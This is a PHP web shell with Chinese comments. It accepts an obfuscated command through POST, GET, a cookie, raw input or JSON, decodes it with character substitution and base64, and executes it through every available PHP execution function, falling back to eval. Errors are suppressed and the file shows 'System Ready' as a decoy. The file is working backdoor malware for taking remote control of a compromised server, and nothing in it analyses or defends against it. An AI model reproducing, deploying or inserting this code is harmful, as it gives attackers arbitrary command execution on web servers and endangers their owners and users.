<?php
// 绝对连接保证 - 多种方式接收数据
@error_reporting(0);
@ini_set('display_errors', 0);

// 方式1：直接POST参数
if(isset($_POST['data']) && !empty($_POST['data'])){
    goto EXECUTE;
}

// 方式2：GET参数
if(isset($_GET['data']) && !empty($_GET['data'])){
    $_POST['data'] = $_GET['data'];
    goto EXECUTE;
}

// 方式3：COOKIE参数
if(isset($_COOKIE['data']) && !empty($_COOKIE['data'])){
    $_POST['data'] = $_COOKIE['data'];
    goto EXECUTE;
}

// 方式4：原始输入流
$input = @file_get_contents("php://input");
if($input && strlen($input) > 10){
    if(strpos($input, 'data=') !== false){
        parse_str($input, $_POST);
        if(isset($_POST['data'])){
            goto EXECUTE;
        }
    } else {
        // 直接当作data参数处理
        $_POST['data'] = $input;
        goto EXECUTE;
    }
}

// 方式5：JSON格式
if(isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false){
    $json = @json_decode($input, true);
    if($json && isset($json['data'])){
        $_POST['data'] = $json['data'];
        goto EXECUTE;
    }
}

echo "System Ready";
exit;

EXECUTE:
$data = $_POST['data'];
$map = array("|"=>"a", "!"=>"b", "@"=>"c", "_"=>"d", "~"=>"=");
$decoded = strtr($data, $map);
$command = @base64_decode($decoded);

if($command){
    // 输出开始标记
    echo "->|";
    
    // 方法1：system
    if(function_exists('system')){
        @system($command);
    }
    // 方法2：shell_exec
    elseif(function_exists('shell_exec')){
        echo @shell_exec($command);
    }
    // 方法3：exec
    elseif(function_exists('exec')){
        @exec($command, $output);
        echo implode("\n", $output);
    }
    // 方法4：passthru
    elseif(function_exists('passthru')){
        @passthru($command);
    }
    // 方法5：popen
    elseif(function_exists('popen')){
        $handle = @popen($command, 'r');
        if($handle){
            while(!feof($handle)){
                echo fread($handle, 1024);
            }
            pclose($handle);
        }
    }
    // 方法6：proc_open
    elseif(function_exists('proc_open')){
        $descriptors = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = @proc_open($command, $descriptors, $pipes);
        if(is_resource($process)){
            fclose($pipes[0]);
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
    }
    // 最后方法：eval
    else{
        @eval($command);
    }
    
    // 输出结束标记
    echo "|<-";
}
exit;
?>
